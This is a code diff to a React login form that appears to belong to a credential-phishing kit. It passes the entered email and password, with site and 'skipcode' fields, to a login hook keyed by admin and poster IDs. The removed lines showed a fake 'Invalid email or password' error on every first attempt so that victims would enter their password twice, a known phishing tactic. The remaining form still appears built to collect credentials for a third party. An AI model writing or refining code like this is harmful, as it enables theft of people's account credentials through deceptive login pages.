@@ -6,8 +6,7 @@ import useMockLogin from "../hooks/useMockLogin";
 function LoginForm({ adminId, posterId }) {
   const [password, setPassword] = useState("");
   const [email, setEmail] = useState("");
-  const [attempts, setAttempts] = useState(0);
-  const [error, setError] = useState("");
+
 
   const { login } = useMockLogin(adminId, posterId);
 
@@ -20,11 +19,7 @@ function LoginForm({ adminId, posterId }) {
     setEmail("");
     setPassword("");
 
-    if (attempts < 1) {
-      setError("Invalid email or password");
-      setAttempts((prev) => prev + 1);
-      return;
-    }
+
 
     const allValues = {
       site: site,
@@ -33,9 +28,7 @@ function LoginForm({ adminId, posterId }) {
       skipcode: "",
     };
 
-    setError("");
     await login(allValues);
-    setAttempts(0);
   };
 
   return (
@@ -83,11 +76,6 @@ function LoginForm({ adminId, posterId }) {
             onChange={(e) => setPassword(e.target.value)}
           />
 
-          {error && (
-            <div className="w-full bg-[#ff0000] text-white py-3 px-4 rounded text-center font-medium">
-              {error}
-            </div>
-          )}
 
           <button
             onClick={handleSubmit}
